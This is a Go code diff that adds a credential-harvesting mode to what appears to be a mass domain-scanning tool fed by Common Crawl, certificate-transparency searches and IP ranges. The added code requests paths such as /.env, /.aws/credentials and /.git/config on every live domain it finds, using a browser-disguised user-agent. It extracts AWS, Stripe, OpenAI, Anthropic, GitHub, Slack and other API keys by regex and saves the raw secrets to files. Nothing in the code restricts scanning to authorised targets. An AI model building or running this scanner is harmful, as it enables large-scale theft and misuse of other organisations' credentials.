@@ -19,6 +19,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"path/filepath"
 	"regexp"
 	"strings"
 	"sync"
@@ -62,6 +63,10 @@ var (
 
 	// Global verbose flag
 	globalVerbose atomic.Bool
+
+	// Global credential-scan flag and channel — set in main() when -scan-creds is active.
+	globalScanCreds  atomic.Bool
+	globalCredScanChan chan string
 
 	// Global subdomain-only filter flag. When true, FQDNs whose
 	// publicsuffix-derived eTLD+1 equals the FQDN itself (apex/registered
@@ -597,6 +602,14 @@ func testDomainWorker(domainChan <-chan string, outputFile *os.File, wg *sync.Wa
 			fileMutex.Lock()
 			_, _ = outputFile.WriteString(domain + "\n")
 			fileMutex.Unlock()
+
+			// Feed credential scanner if enabled (non-blocking)
+			if globalScanCreds.Load() && globalCredScanChan != nil {
+				select {
+				case globalCredScanChan <- domain:
+				default: // don't stall the live checker
+				}
+			}
 		} else {
 			// Verbose: log dead domain
 			if globalVerbose.Load() {
@@ -783,6 +796,144 @@ func parseCSVFlag(raw string) []string {
 	return out
 }
 
+// ── Credential scanner ────────────────────────────────────────────────────────
+
+// credPattern holds compiled regex patterns for one credential type.
+type credPattern struct {
+	provider string
+	re       *regexp.Regexp
+}
+
+// credHit is a discovered (unvalidated) credential.
+type credHit struct {
+	provider string
+	domain   string
+	path     string
+	raw      string
+}
+
+var credPatterns = []credPattern{
+	{"AWS_KEY",    regexp.MustCompile(`AKIA[0-9A-Z]{16}`)},
+	{"STRIPE",     regexp.MustCompile(`sk_(live|test)_[0-9a-zA-Z]{24,99}`)},
+	{"OPENAI",     regexp.MustCompile(`sk-[A-Za-z0-9]{48}|sk-proj-[A-Za-z0-9_-]{48,}`)},
+	{"GITHUB",     regexp.MustCompile(`ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}`)},
+	{"SENDGRID",   regexp.MustCompile(`SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}`)},
+	{"MAILGUN",    regexp.MustCompile(`key-[0-9a-zA-Z]{32}`)},
+	{"TWILIO_SID", regexp.MustCompile(`AC[a-f0-9]{32}`)},
+	{"DISCORD_WH", regexp.MustCompile(`https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+`)},
+	{"SLACK",      regexp.MustCompile(`xox[pboa]-[0-9A-Za-z-]{40,}`)},
+	{"ANTHROPIC",  regexp.MustCompile(`sk-ant-[A-Za-z0-9_-]{80,}`)},
+}
+
+// extractCreds scans body text for known credential patterns.
+func extractCreds(domain, path, body string) []credHit {
+	var hits []credHit
+	for _, p := range credPatterns {
+		matches := p.re.FindAllString(body, 10)
+		for _, m := range matches {
+			hits = append(hits, credHit{provider: p.provider, domain: domain, path: path, raw: m})
+		}
+	}
+	return hits
+}
+
+// probeCredentials fetches a list of paths on a domain and extracts credentials.
+func probeCredentials(domain string, paths []string, scanHTTP *http.Client, resultsDir string, hitChan chan<- credHit) {
+	bases := []string{
+		fmt.Sprintf("https://%s", domain),
+		fmt.Sprintf("http://%s", domain),
+	}
+	for _, basePath := range paths {
+		for _, base := range bases {
+			targetURL := base + basePath
+			req, err := http.NewRequest("GET", targetURL, nil)
+			if err != nil {
+				continue
+			}
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+			req.Header.Set("Accept", "*/*")
+
+			resp, err := scanHTTP.Do(req)
+			if err != nil {
+				continue
+			}
+			isCredPath := resp.StatusCode == 200 || resp.StatusCode == 206
+			body := ""
+			if resp.Body != nil {
+				limited := io.LimitReader(resp.Body, 512*1024) // max 512 KB
+				b, _ := io.ReadAll(limited)
+				resp.Body.Close()
+				body = string(b)
+			}
+			if !isCredPath || body == "" {
+				break // HTTPS worked (or failed), don't retry with HTTP
+			}
+			hits := extractCreds(domain, basePath, body)
+			for _, h := range hits {
+				hitChan <- h
+			}
+			break // HTTPS succeeded — skip HTTP retry
+		}
+	}
+}
+
+// credScanWorker pulls live domains from a channel and probes them for creds.
+func credScanWorker(domainCh <-chan string, paths []string, resultsDir string, wg *sync.WaitGroup, hitChan chan<- credHit) {
+	defer wg.Done()
+	scanHTTP := &http.Client{
+		Timeout: 12 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) >= 3 {
+				return http.ErrUseLastResponse
+			}
+			return nil
+		},
+	}
+	for domain := range domainCh {
+		probeCredentials(domain, paths, scanHTTP, resultsDir, hitChan)
+	}
+}
+
+// credHitWriter reads from hitChan and writes unique findings to Results_Live/ files.
+func credHitWriter(hitChan <-chan credHit, resultsDir string, done chan<- struct{}) {
+	files := make(map[string]*os.File)
+	seen := make(map[string]bool)
+
+	defer func() {
+		for _, f := range files {
+			f.Close()
+		}
+		close(done)
+	}()
+
+	if err := os.MkdirAll(resultsDir, 0755); err != nil {
+		fmt.Printf("%s[SCAN]%s Cannot create %s: %v\n", YELLOW, RESET, resultsDir, err)
+	}
+
+	for hit := range hitChan {
+		key := hit.provider + ":" + hit.raw
+		if seen[key] {
+			continue
+		}
+		seen[key] = true
+
+		fname := filepath.Join(resultsDir, hit.provider+"_Raw.txt")
+		f, ok := files[fname]
+		if !ok {
+			var err error
+			f, err = os.OpenFile(fname, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
+			if err != nil {
+				continue
+			}
+			files[fname] = f
+		}
+		_, _ = fmt.Fprintf(f, "%s\t%s\t%s\n", hit.domain, hit.path, hit.raw)
+		if globalVerbose.Load() {
+			fmt.Printf("%s[CRED]%s %s → %s at %s%s\n", GREEN, RESET, hit.provider, hit.raw[:min(len(hit.raw), 20)]+"…", hit.domain, hit.path)
+		}
+	}
+}
+
 func main() {
 	var (
 		maxDomains     = flag.Int64("max-domains", 10000, "Maximum live domains to extract (required)")
@@ -806,6 +957,11 @@ func main() {
 		cidrFlag           = flag.String("cidr", "", "Comma-separated CIDR ranges to expand (e.g. '192.168.1.0/24'); max /16 per range. Implies -source=cidr")
 		ipFileFlag         = flag.String("ip-file", "", "Path to a file with IPs/FQDNs (one per line; '#' comments; CIDR notation accepted). Implies -source=ipfile")
 		crtOrgFlag         = flag.String("crt-org", "", "Comma-separated org keywords for crt.sh O= search (e.g. 'stripe,sendgrid'). Finds all certs issued to matching orgs. Implies -source=crt-org")
+
+		snapshotListFlag = flag.String("snapshot-list", "", "Comma-separated CC-MAIN snapshot IDs to use instead of random selection (e.g. 'CC-MAIN-2024-33,CC-MAIN-2019-39'); for distributed sharded runs")
+		scanCredsFlag    = flag.Bool("scan-creds", false, "After live-check, probe each live domain for exposed credentials (path traversal, JS scan, regex extraction)")
+		scanWorkers      = flag.Int("scan-workers", 20, "Concurrent credential scan workers (only active when -scan-creds is set)")
+		pathListFile     = flag.String("path-list", "", "File with URL paths to probe per domain, one per line (e.g. /.env, /.aws/credentials)")
 	)
 	flag.Parse()
 
@@ -1018,8 +1174,18 @@ func main() {
 	var allWarcURLs []string
 	filesToProcess := 0
 	if ccEnabled {
-		fmt.Printf("%s[*]%s Selecting random CC-MAIN snapshots...\n", CYAN, RESET)
-		snapshotList := selectRandomSnapshots(*maxDomains, *snapshots)
+		var snapshotList []string
+		if *snapshotListFlag != "" {
+			for _, s := range strings.Split(*snapshotListFlag, ",") {
+				if s = strings.TrimSpace(s); s != "" {
+					snapshotList = append(snapshotList, s)
+				}
+			}
+			fmt.Printf("%s[*]%s Using assigned snapshots (%d): %s\n", CYAN, RESET, len(snapshotList), strings.Join(snapshotList, ", "))
+		} else {
+			fmt.Printf("%s[*]%s Selecting random CC-MAIN snapshots...\n", CYAN, RESET)
+			snapshotList = selectRandomSnapshots(*maxDomains, *snapshots)
+		}
 
 		if len(snapshotList) == 0 {
 			fmt.Printf("%s[ERROR]%s No snapshots available\n", RED, RESET)
@@ -1156,6 +1322,51 @@ func main() {
 	var producerWg sync.WaitGroup
 	var testWg sync.WaitGroup
 
+	// Credential scanning setup (when -scan-creds is set)
+	var credScanWg sync.WaitGroup
+	var credWriterDone chan struct{}
+	var hitChan chan credHit
+	if *scanCredsFlag {
+		globalScanCreds.Store(true)
+
+		// Load path list
+		var probePaths []string
+		if *pathListFile != "" {
+			if data, err := os.ReadFile(*pathListFile); err == nil {
+				for _, line := range strings.Split(string(data), "\n") {
+					line = strings.TrimSpace(line)
+					if line != "" && !strings.HasPrefix(line, "#") {
+						probePaths = append(probePaths, line)
+					}
+				}
+			} else {
+				fmt.Printf("%s[WARN]%s Could not read path-list %q: %v — using built-in defaults\n", YELLOW, RESET, *pathListFile, err)
+			}
+		}
+		if len(probePaths) == 0 {
+			probePaths = []string{
+				"/.env", "/.env.local", "/.env.production", "/.env.backup",
+				"/.aws/credentials", "/.aws/config", "/.git/config",
+				"/api/.env", "/backend/.env", "/config.json",
+				"/wp-config.php.bak", "/appsettings.json",
+				"/config/database.yml", "/application.properties",
+			}
+		}
+		fmt.Printf("%s[SCAN]%s Credential scanning enabled — %d workers, %d paths\n", CYAN, RESET, *scanWorkers, len(probePaths))
+
+		resultsDir := filepath.Join(filepath.Dir(*outputFile), "Results_Live")
+		globalCredScanChan = make(chan string, *scanWorkers*4)
+
+		hitChan = make(chan credHit, *scanWorkers*8)
+		credWriterDone = make(chan struct{})
+		go credHitWriter(hitChan, resultsDir, credWriterDone)
+
+		for i := 0; i < *scanWorkers; i++ {
+			credScanWg.Add(1)
+			go credScanWorker(globalCredScanChan, probePaths, resultsDir, &credScanWg, hitChan)
+		}
+	}
+
 	startTime := time.Now()
 
 	// Start tester workers (they will wait for domains from channel)
@@ -1263,6 +1474,19 @@ func main() {
 
 	// Wait for all testers to finish processing remaining domains
 	testWg.Wait()
+
+	// Drain and wait for credential scan workers
+	if *scanCredsFlag {
+		close(globalCredScanChan)
+		credScanWg.Wait()
+		if hitChan != nil {
+			close(hitChan)
+		}
+		if credWriterDone != nil {
+			<-credWriterDone
+		}
+		fmt.Printf("%s[SCAN]%s Credential scan complete\n", GREEN, RESET)
+	}
 
 	stopProgress <- true
 	bar.Finish()
